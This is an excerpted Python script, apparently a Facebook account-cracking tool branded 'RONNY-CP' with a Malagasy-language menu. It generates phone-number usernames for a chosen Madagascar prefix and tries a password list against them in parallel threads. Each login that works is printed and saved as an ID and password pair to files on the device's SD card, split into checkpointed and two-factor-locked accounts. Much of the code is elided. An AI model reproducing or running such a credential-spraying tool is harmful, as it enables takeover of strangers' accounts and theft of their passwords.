...
try:
    ...
    os.system('python Ronny-malagasy.py')
...
def xyz():
    ...
    print(f"")
    print(f"\033[1;91m========================================================")
    Kashif = input("[âˆš] SAFIDIO : ")
    if Kashif in ["1","01"]:
        Random()
    elif Kashif in ["0","00"]:
       exit()
    else:
        print('\033[1;31mDISO SAFIDY!\033[1;31m')
        xyz()
...
def Random():
    ...
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}ISANY KAONTY             : {RED}"+tl)
        print(f" {WHITE}COUNTRY YOU CHOOSE    : MADAGASCAR ")
        print(f" {WHITE}SAFIDIO NUMERO        : {RED}"+code)
        print(f" {WHITE}PROCESS HAS BEEN STARTED")
        print(f" {WHITE}MIANDRY SISA.......")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid=coki[141:156]
                Red = '\033[1;31m'
                print(f'\r{Red}[Ã—]--------------------[RONNY-CP]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')
                open('/sdcard/Ronny-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                cid=coki[7:22]
                Red = '\033[1;31m'
                print(f'\r{YELLOW}[RONNY-LOCK] '+cid+' | '+ps+'\033[1;97m')
                open('/sdcard/Ronny-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[RONNY] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
